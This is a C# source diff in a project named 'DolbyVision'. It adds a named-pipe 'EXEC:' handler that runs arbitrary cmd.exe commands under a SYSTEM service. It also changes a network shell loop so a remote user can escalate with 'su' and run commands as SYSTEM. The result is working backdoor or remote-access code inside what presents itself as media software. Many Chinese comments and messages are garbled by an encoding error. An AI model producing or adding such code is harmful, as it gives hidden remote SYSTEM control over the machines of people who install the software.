@@ -230,6 +230,12 @@ namespace DolbyVision
                                 string result = KillProcess(pidStr);
                                 writer.WriteLine(result);
                             }
+                            else if (request != null && request.StartsWith("EXEC:"))
+                            {
+                                string command = request.Substring(5);
+                                string result = ExecuteCmdViaPipe(command);
+                                writer.WriteLine(result);
+                            }
                             else
                             {
                                 writer.WriteLine("ERROR: unknown command");
@@ -778,6 +784,50 @@ namespace DolbyVision
             }
             catch { return null; }
         }
+
+        // SYSTEM模式通过命名管道执行命令(供普通模式提权调用)
+        private static string ExecuteCmdViaPipe(string command)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    StandardOutputEncoding = Encoding.GetEncoding(936),
+                    StandardErrorEncoding = Encoding.GetEncoding(936)
+                };
+                using (var p = Process.Start(psi))
+                {
+                    string output = p.StandardOutput.ReadToEnd();
+                    string error = p.StandardError.ReadToEnd();
+                    p.WaitForExit(8000);
+                    return "OK:\\r\\n" + output + (string.IsNullOrEmpty(error) ? "" : "\\r\\n[错误]\\r\\n" + error);
+                }
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // 普通模式通过命名管道请求SYSTEM模式执行命令
+        private static string ExecViaPipe(string command)
+        {
+            try
+            {
+                using (var client = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut))
+                {
+                    client.Connect(2000);
+                    using (var writer = new StreamWriter(client, Encoding.UTF8) { AutoFlush = true })
+                    using (var reader = new StreamReader(client, Encoding.UTF8))
+                    {
+                        writer.WriteLine("EXEC:" + command);
+                        return reader.ReadLine();
+                    }
+                }
+            }
+            catch { return null; }
+        }
         private static string InstallService()
         {
             try
@@ -994,15 +1044,102 @@ namespace DolbyVision
                     { IsBackground = true };
                     errorThread.Start();
 
-                    // 输入转发
+                    // 杈撳叆杞彂(閫愬瓧绗︾疮绉?鎹㈣鏃舵娴媠u/exit鎻愭潈)
                     byte[] inBuffer = new byte[4096];
+                    System.Text.StringBuilder lineBuf = new System.Text.StringBuilder();
+                    bool privMode = false; // SYSTEM鎻愭潈浼氳瘽妯″紡
                     while (!shell.HasExited && client.Connected)
                     {
                         int read = stream.Read(inBuffer, 0, inBuffer.Length);
                         if (read <= 0) break;
-                        string input = Encoding.UTF8.GetString(inBuffer, 0, read);
-                        shell.StandardInput.Write(input);
-                        shell.StandardInput.Flush();
+                        string chunk = Encoding.UTF8.GetString(inBuffer, 0, read);
+                        foreach (char c in chunk)
+                        {
+                            if (c == '\r' || c == '\n')
+                            {
+                                if (c == '\n')
+                                {
+                                    string line = lineBuf.ToString();
+                                    lineBuf.Clear();
+                                    string trimmed = line.Trim();
+                                    if (!_isServiceMode && trimmed == "su")
+                                    {
+                                        // 杩涘叆SYSTEM鎻愭潈浼氳瘽妯″紡
+                                        string test = ExecViaPipe("echo ok");
+                                        if (test != null)
+                                        {
+                                            privMode = true;
+                                            byte[] ok = Encoding.UTF8.GetBytes("\\r\\n[宸茶繘鍏YSTEM鏉冮檺,杈撳叆exit閫€鍑篯\\r\\n");
+                                            stream.Write(ok, 0, ok.Length); stream.Flush();
+                                        }
+                                        else
+                                        {
+                                            byte[] err = Encoding.UTF8.GetBytes("\\r\\n[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            stream.Write(err, 0, err.Length); stream.Flush();
+                                        }
+                                    }
+                                    else if (!_isServiceMode && trimmed.StartsWith("su "))
+                                    {
+                                        // 鍗曟SYSTEM鎻愭潈鎵ц
+                                        string cmd = trimmed.Substring(3).Trim();
+                                        string privResult = ExecViaPipe(cmd);
+                                        if (privResult != null)
+                                        {
+                                            byte[] resp = Encoding.UTF8.GetBytes("\\r\\n[SYSTEM] " + privResult + "\\r\\n");
+                                            stream.Write(resp, 0, resp.Length); stream.Flush();
+                                        }
+                                        else
+                                        {
+                                            byte[] err = Encoding.UTF8.GetBytes("\\r\\n[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            stream.Write(err, 0, err.Length); stream.Flush();
+                                        }
+                                    }
+                                    else if (privMode && trimmed == "exit")
+                                    {
+                                        // 閫€鍑篠YSTEM鎻愭潈浼氳瘽妯″紡
+                                        privMode = false;
+                                        byte[] ok = Encoding.UTF8.GetBytes("\\r\\n[宸查€€鍑篠YSTEM鏉冮檺,鍥炲埌鏅€氭ā寮廬\\r\\n");
+                                        stream.Write(ok, 0, ok.Length); stream.Flush();
+                                    }
+                                    else if (privMode)
+                                    {
+                                        // 鎻愭潈妯″紡:閫氳繃鍛藉悕绠￠亾浠YSTEM鎵ц
+                                        string privResult = ExecViaPipe(line);
+                                        if (privResult != null)
+                                        {
+                                            byte[] resp = Encoding.UTF8.GetBytes(privResult + "\\r\\n");
+                                            stream.Write(resp, 0, resp.Length); stream.Flush();
+                                        }
+                                        else
+                                        {
+                                            byte[] err = Encoding.UTF8.GetBytes("[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            stream.Write(err, 0, err.Length); stream.Flush();
+                                        }
+                                    }
+                                    else
+                                    {
+                                        // 鏅€氭ā寮?鏁磋鍙戠粰shell
+                                        shell.StandardInput.WriteLine(line);
+                                        shell.StandardInput.Flush();
+                                    }
+                                }
+                            }
+                            else if (c == '\b')
+                            {
+                                if (lineBuf.Length > 0)
+                                {
+                                    lineBuf.Remove(lineBuf.Length - 1, 1);
+                                    byte[] bs = Encoding.UTF8.GetBytes("\\b \\b");
+                                    stream.Write(bs, 0, bs.Length); stream.Flush();
+                                }
+                            }
+                            else
+                            {
+                                lineBuf.Append(c);
+                                byte[] echo = Encoding.UTF8.GetBytes(c.ToString());
+                                stream.Write(echo, 0, echo.Length); stream.Flush();
+                            }
+                        }
                     }
                 }
             }
